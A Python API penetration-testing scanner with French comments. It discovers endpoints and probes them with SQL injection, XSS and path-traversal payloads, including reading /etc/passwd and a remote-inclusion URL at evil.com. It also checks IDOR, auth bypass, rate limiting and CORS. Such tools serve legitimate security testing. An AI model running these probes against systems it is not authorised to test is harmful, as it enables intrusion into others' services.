import requests
import json
import time
import sys
import urllib3
from urllib.parse import urljoin

# Désactiver les warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APIPentestScanner:
    def __init__(self, base_url, wordlist=None, token=None):
        self.base_url = base_url.rstrip("/")
        self.wordlist = wordlist or ["login", "users", "admin", "api", "auth", "dashboard"]
        self.token = token
        self.results = []
        self.vulns = []

    def _request(self, endpoint, method="GET", data=None, headers=None, params=None):
        url = urljoin(self.base_url + "/", endpoint.lstrip("/"))
        try:
            r = requests.request(
                method=method.upper(),
                url=url,
                headers=headers,
                params=params,
                json=data,
                timeout=5,
                verify=False
            )
            return r
        except Exception as e:
            return None

    # --- 1. Endpoint discovery ---
    def discover_endpoints(self):
        print("[+] Scanning endpoints...")
        for word in self.wordlist:
            for method in ["GET", "POST", "PUT", "DELETE"]:
                r = self._request(word, method)
                if r and r.status_code not in [404, 400]:
                    self.results.append({
                        "endpoint": word,
                        "method": method,
                        "status": r.status_code
                    })
                    print(f"  [FOUND] {method} {word} ({r.status_code})")

    # --- 2. SQL Injection ---
    def test_sql_injection(self):
        print("[+] Testing SQL Injection...")
        payloads = ["' OR 1=1 --", "' UNION SELECT NULL --", "' OR 'a'='a"]
        for res in self.results:
            for p in payloads:
                r = self._request(res["endpoint"], params={"id": p})
                if r and any(x in r.text.lower() for x in ["sql", "mysql", "syntax", "error"]):
                    self.vulns.append({"type": "SQLi", "endpoint": res["endpoint"], "payload": p})
                    print(f"  [VULN] Possible SQLi at {res['endpoint']} with payload {p}")

    # --- 3. XSS ---
    def test_xss(self):
        print("[+] Testing XSS...")
        payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']
        for res in self.results:
            for p in payloads:
                r = self._request(res["endpoint"], params={"q": p})
                if r and p in r.text:
                    self.vulns.append({"type": "XSS", "endpoint": res["endpoint"], "payload": p})
                    print(f"  [VULN] Possible XSS at {res['endpoint']}")

    # --- 4. LFI / RFI ---
    def test_lfi_rfi(self):
        print("[+] Testing LFI/RFI...")
        payloads = ["../../../../etc/passwd", "http://evil.com/malicious"]
        for res in self.results:
            for p in payloads:
                r = self._request(res["endpoint"], params={"file": p})
                if r and ("root:" in r.text or "Warning" in r.text):
                    self.vulns.append({"type": "LFI/RFI", "endpoint": res["endpoint"], "payload": p})
                    print(f"  [VULN] Possible LFI/RFI at {res['endpoint']}")

    # --- 5. IDOR ---
    def test_idor(self):
        print("[+] Testing IDOR...")
        for res in self.results:
            r1 = self._request(res["endpoint"], params={"id": 1})
            r2 = self._request(res["endpoint"], params={"id": 2})
            if r1 and r2 and r1.text != r2.text and r1.status_code == 200 and r2.status_code == 200:
                self.vulns.append({"type": "IDOR", "endpoint": res["endpoint"]})
                print(f"  [VULN] Possible IDOR at {res['endpoint']}")

    # --- 6. Auth / JWT ---
    def test_auth_bypass(self):
        print("[+] Testing Auth bypass / JWT...")
        for res in self.results:
            headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
            r_with_auth = self._request(res["endpoint"], headers=headers)
            r_no_auth = self._request(res["endpoint"])
            if r_with_auth and r_no_auth and r_no_auth.status_code == 200:
                self.vulns.append({"type": "Auth bypass", "endpoint": res["endpoint"]})
                print(f"  [VULN] Auth bypass possible at {res['endpoint']}")

    # --- 7. Rate limiting ---
    def test_rate_limit(self):
        print("[+] Testing Rate Limiting...")
        for res in self.results:
            responses = []
            for i in range(10):
                r = self._request(res["endpoint"])
                if r:
                    responses.append(r.status_code)
                time.sleep(0.1)
            if all(code == 200 for code in responses):
                self.vulns.append({"type": "No Rate Limiting", "endpoint": res["endpoint"]})
                print(f"  [VULN] No rate limiting on {res['endpoint']}")

    # --- 8. CORS / HTTP security ---
    def test_cors_http(self):
        print("[+] Testing CORS and HTTP...")
        for res in self.results:
            r = self._request(res["endpoint"])
            if r:
                if "Access-Control-Allow-Origin" in r.headers:
                    if r.headers["Access-Control-Allow-Origin"] == "*":
                        self.vulns.append({"type": "CORS misconfig", "endpoint": res["endpoint"]})
                        print(f"  [VULN] CORS misconfig on {res['endpoint']}")
                if self.base_url.startswith("http://"):
                    self.vulns.append({"type": "HTTP insecure", "endpoint": res["endpoint"]})
                    print(f"  [VULN] HTTP insecure on {res['endpoint']}")

    # --- 9. Rapports ---
    def generate_report(self, filename="api_scan_report.json"):
        report = {
            "base_url": self.base_url,
            "endpoints_found": self.results,
            "vulnerabilities": self.vulns
        }
        with open(filename, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report saved to {filename}")

    # --- Run full scan ---
    def run(self):
        print("=== Starting API Pentest Scanner ===")
        self.discover_endpoints()
        self.test_sql_injection()
        self.test_xss()
        self.test_lfi_rfi()
        self.test_idor()
        self.test_auth_bypass()
        self.test_rate_limit()
        self.test_cors_http()
        self.generate_report()
        print("=== Scan finished ===")

# --- CLI simple pour tests standalone ---
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python api_tests.py <base_url>")
        sys.exit(1)
    url = sys.argv[1]
    scanner = APIPentestScanner(url)
    scanner.run()
